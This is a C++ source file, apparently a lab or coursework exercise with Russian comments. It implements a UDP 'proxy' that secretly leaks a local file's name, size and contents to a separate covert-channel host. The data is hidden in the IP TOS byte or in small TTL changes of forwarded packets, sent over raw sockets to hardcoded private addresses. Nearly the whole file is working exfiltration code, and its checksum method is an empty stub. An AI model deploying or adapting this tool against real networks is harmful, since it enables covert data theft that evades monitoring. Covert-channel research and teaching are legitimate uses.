#include <arpa/inet.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <termios.h>
#include <unistd.h>

#include <algorithm>
#include <bitset>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <string>
#include <tuple>
#include <vector>

#define HEADLINE(msg)                                                       \
    std::cout << "-----------------------------------------------------\n"; \
    std::cout << msg;                                                       \
    std::cout << "-----------------------------------------------------\n"

enum HOSTS {
    HOST_INVALID = -1,
    HOST_COVERT_CHANNEL,
    HOST_EXT,
    HOST_PROXY,
    HOST_INT
};
enum METHODS { INVALID_METHOS = -1, TTL, QOS, CHECKSUM };

static const char ADDRS[][16] = {
    "192.168.1.11", "192.168.1.11", "192.168.1.12", "192.168.1.10"};
static const int PORTS[]            = {9091, 9090, 9090, 9090};

static const u_int32_t INET_ADDRS[] = {
    inet_addr(ADDRS[HOST_COVERT_CHANNEL]), inet_addr(ADDRS[HOST_EXT]),
    inet_addr(ADDRS[HOST_PROXY]), inet_addr(ADDRS[HOST_INT])};
static const u_int16_t INET_PORTS[] = {
    htons(PORTS[HOST_COVERT_CHANNEL]), htons(PORTS[HOST_EXT]),
    htons(PORTS[HOST_PROXY]), htons(PORTS[HOST_INT])};

enum RANGES { R_MIN, R_MAX };
static const __uint16_t TTL_VAL[2] = {32, 128};

static const __uint16_t udph_len   = sizeof(struct udphdr);
static const __uint16_t iph_len    = sizeof(struct iphdr);
static const __uint16_t headers_len =
    sizeof(struct iphdr) + sizeof(struct udphdr);

static const auto MAX_PKT_LENTH        = 65535;
static __uint8_t buffer[MAX_PKT_LENTH] = {0};

static struct iphdr* iph               = (struct iphdr*)buffer;
static struct udphdr* udph             = (struct udphdr*)(buffer + iph_len);

static sockaddr_in sender_addr         = {0};
static socklen_t sender_addrlen        = sizeof(sender_addr);

static sockaddr_in dest_addr           = {0};
static socklen_t dest_addrlen          = sizeof(dest_addr);

// Для синхронизации передачи метаданных о файле: -1 - передача не начата, 0 -
// передается имя файла, 1 - передается размер, 2 - передаются данные
enum TRANSMISSION_PROGRESS {
    TRANS_NOT = -1,
    TRANS_FILENAME,
    TRANS_FILESIZE,
    TRANS_DATA,
    TRANS_FINISHED
};
static int in_progress               = TRANS_NOT;
// Размер имени файла в байтах
static const __uint8_t FILENAME_SIZE = 16;
// Тип переменной размера в байтах (т.е. длина переменной - 4 байта, передается
// за 4 такта, => макс размер 2^32 = 4 Гб)
typedef __uint32_t size_type;
static const __uint8_t FILE_SIZE   = sizeof(size_type);
// Кол-во отправленных фрагментов; в зависимости от метода фрагмент будет битом,
// байтом, etc.
static size_type bytes_transmissed = 0;

static const char usage[] =
    "Usage: ./proxy "
    "<path/to/file/filename> <method>.\nMethods: \"QOS\", "
    "\"TTL\", \"CHECKSUM\"";
static const char sections[][10] = {"Filename", "File size", "File data"};
static const char stages[][40]   = {
    "Start of the ", " transmission.", " has been successfully transmissied."};

METHODS paramValidation(const int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Invalid argument count.\n" << usage << std::endl;
        exit(1);
    }
    std::string arg(argv[2]);
    METHODS method = arg == "QOS"      ? QOS
                   : arg == "TTL"      ? TTL
                   : arg == "CHECKSUM" ? CHECKSUM
                                       : INVALID_METHOS;
    if (method == INVALID_METHOS) {
        std::cerr << "Invalid method added.\n" << usage << std::endl;
        exit(2);
    }
    return method;
}

// Обработчик для событий интерфейса (нажатия клавиш)
int kbhit(void) {
    struct termios oldt, newt;
    int ch;
    int oldf;

    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);
    oldf = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, oldf | O_NONBLOCK);

    ch = getchar();

    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    fcntl(STDIN_FILENO, F_SETFL, oldf);

    if (ch != EOF) {
        ungetc(ch, stdin);
        return 1;
    }

    return 0;
}

// Реализация типа прокси (нет): переадресовывает пакеты изнутри вовне
HOSTS proxyDeployment(int& sock) {
    // UDP
    if (iph->protocol != 17) return HOST_INVALID;

    HOSTS dest_host;
    const auto& saddr(iph->saddr);

    dest_host =
        saddr != INET_ADDRS[HOST_EXT] ? dest_host = HOST_EXT : HOST_INVALID;

    if (dest_host == HOST_INVALID) return HOST_INVALID;

    // Меняем адрес назначения в самом фрейме
    iph->daddr = INET_ADDRS[dest_host];

    struct sockaddr_in dest_addr;
    socklen_t dest_addrlen    = sizeof(dest_addr);
    dest_addr.sin_family      = AF_INET;
    dest_addr.sin_addr.s_addr = INET_ADDRS[dest_host];
    dest_addr.sin_port        = INET_PORTS[dest_host];

    if (sendto(
            sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest_addr,
            dest_addrlen
        ) < 0) {
        perror("sendto() error: ");
        exit(3);
    }

    return dest_host;
}

static bool QOSImplementation(
    int& sock, const std::string& filename, const size_type& size,
    const std::string& data, std::string::const_iterator& iter
) {
    __uint8_t byte(0x00);
    int is_finished = TRANS_NOT;

    if (bytes_transmissed == 0)
        std::cout << stages[0] << sections[in_progress] << stages[1]
                  << std::endl;

    switch (in_progress) {
        // Передается имя файла
        case TRANS_FILENAME:
            byte = filename[bytes_transmissed++];
            if (bytes_transmissed == FILENAME_SIZE) goto qosL1;
            break;
        // Передается размер
        case TRANS_FILESIZE:
            byte = size >> (bytes_transmissed++ * 8);
            if (bytes_transmissed == FILE_SIZE) goto qosL1;
            break;
        // Передается содержимое файла
        case TRANS_DATA:
            byte = data[bytes_transmissed++];
            if (bytes_transmissed == size) goto qosL1;
            break;
        default:
            std::cerr << "Invalid transmission status.\n";
            exit(2);
    }

    if (false) {
    qosL1:
        is_finished       = in_progress++;
        bytes_transmissed = 0;
    }

    std::cout << std::setw(2) << std::setfill('0') << "Changing TOS field from "
              << std::hex << __uint16_t(iph->tos) << " to " << __uint16_t(byte)
              << std::dec << std::endl;

    // Отправляем новый пакет по скрытому каналу
    iph->daddr = INET_ADDRS[HOST_COVERT_CHANNEL];
    udph->dest = INET_PORTS[HOST_COVERT_CHANNEL];
    iph->tos   = byte;

    if (sendto(
            sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest_addr,
            dest_addrlen
        ) < 0) {
        perror("sendto() error: ");
        exit(3);
    }

    if (is_finished != TRANS_NOT)
        std::cout << sections[is_finished] << stages[2] << std::endl;

    return in_progress == TRANS_FINISHED ? true : false;
}

static bool TTLImplementation(
    int& sock, const std::string& filename, const size_type& size,
    const std::string& data, std::string::const_iterator& iter
) {
    // В пакетах
    static const auto waiting_period = 10;
    static auto cur_pkt              = 0;
    static auto avarage_ttl          = 0;

    // Определяем среднее значение ttl: оно будет ttl_min (кодирует 0), ttl_max
    // = ttl_min + 1 (кодирует 1)
    if (cur_pkt < waiting_period) {
        std::cout << "Flows listening...\n";
        avarage_ttl += iph->ttl;
        ++cur_pkt;
        return 0;
    }
    if (cur_pkt == waiting_period) {
        ++cur_pkt;
        avarage_ttl /= waiting_period;
        std::cout << "Average TTL field value: " << avarage_ttl << std::endl;
        std::cout << "The Covert Channel has been activated.\n";
    }

    static __uint8_t bit_ind;
    std::bitset<1> bit = 0;
    int is_finished    = TRANS_NOT;

    if (bytes_transmissed == 0 && bit_ind == 0) {
        std::cout << stages[0] << sections[in_progress] << stages[1]
                  << std::endl;
        bit_ind = 0;
    }

    switch (in_progress) {
        // Передается имя файлы
        case TRANS_FILENAME:
            bit = filename[bytes_transmissed] >> bit_ind++;
            std::cout << bit;
            if (bit_ind == 8) {
                ++bytes_transmissed;
                bit_ind = 0;
                std::cout << std::endl;
            }
            if (bytes_transmissed == FILENAME_SIZE) goto ttlL1;
            break;
        // Передается размер
        case TRANS_FILESIZE:
            bit = size >> bit_ind++;
            std::cout << bit;
            if (bit_ind == FILE_SIZE * 8) {
                std::cout << std::endl;
                bit_ind = 0;
                goto ttlL1;
            };
            break;
        // Передается содержимое файла
        case TRANS_DATA:
            bit = data[bytes_transmissed] >> bit_ind++;
            std::cout << bit;
            if (bit_ind == 8) {
                ++bytes_transmissed;
                bit_ind = 0;
                std::cout << std::endl;
            };
            if (bytes_transmissed == size) goto ttlL1;
            break;
        default:
            std::cerr << "Invalid transmission status.\n";
            exit(2);
    }

    if (false) {
    ttlL1:
        is_finished       = in_progress++;
        bytes_transmissed = 0;
    }

    // Отправляем новый пакет по скрытому каналу
    iph->daddr = INET_ADDRS[HOST_COVERT_CHANNEL];
    udph->dest = INET_PORTS[HOST_COVERT_CHANNEL];
    auto& ttl  = iph->ttl;
    ttl        = bit == 0x00       ? ttl <= avarage_ttl ? ttl : avarage_ttl
               : ttl > avarage_ttl ? ttl
                                   : avarage_ttl + 1;

    if (sendto(
            sock, buffer, ntohs(iph->tot_len), 0, (struct sockaddr*)&dest_addr,
            dest_addrlen
        ) < 0) {
        perror("sendto() error: ");
        exit(3);
    }

    if (is_finished != TRANS_NOT)
        std::cout << sections[is_finished] << stages[2] << std::endl;

    return in_progress == TRANS_FINISHED ? true : false;
}

static bool CHECKSUMImplementation(
    int& sock, const std::string& filename, const size_type& size,
    const std::string& data, std::string::const_iterator& iter
) {
    return 0;
}

typedef bool (*fn
)(int&, const std::string&, const size_type&, const std::string&,
  std::string::const_iterator&);
// Возвращают 0, если передача в рамках текущей сессии продолжается, и 1,
// если завершена (был передан последний байт сообщения)
static fn implementations[] = {
    TTLImplementation, QOSImplementation, CHECKSUMImplementation};

int main(int argc, char* argv[]) {
    auto method = paramValidation(argc, argv);

    auto sock   = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("socket error: ");
        exit(3);
    }

    int one        = 1;
    const int* val = &one;
    // Выставляем флаг для сокета на уровне IP на IP_HDRINCL, т.е.
    // что будем формировать весь пакет начиная с IP (IP + UDP +
    // Data) сами
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() error: ");
        exit(4);
    }

    const std::string filename(argv[1]);
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Unable to open file.\n" << usage << std::endl;
        exit(2);
    }
    std::ostringstream os;
    os << file.rdbuf();
    const auto data           = os.str();
    const size_type file_size = data.size();
    auto iter                 = data.begin();

    dest_addr.sin_family      = AF_INET;
    dest_addr.sin_addr.s_addr = INET_ADDRS[HOST_COVERT_CHANNEL];
    dest_addr.sin_port        = INET_PORTS[HOST_COVERT_CHANNEL];

    HEADLINE("Start of Forwarding.\n");
    in_progress = TRANS_FILENAME;
    auto is_finished(false);
    while (!is_finished && !kbhit()) {
        auto valread = recvfrom(
            sock, buffer, MAX_PKT_LENTH, 0, (struct sockaddr*)&sender_addr,
            &sender_addrlen
        );
        if (valread <= 0) break;

        auto dest_host = proxyDeployment(sock);
        if (dest_host == HOST_INVALID) continue;

        is_finished =
            implementations[method](sock, filename, file_size, data, iter);
        if (is_finished) break;
    }
    HEADLINE("End of Forwarding.\n");
    shutdown(sock, SHUT_RDWR);
    return 0;
}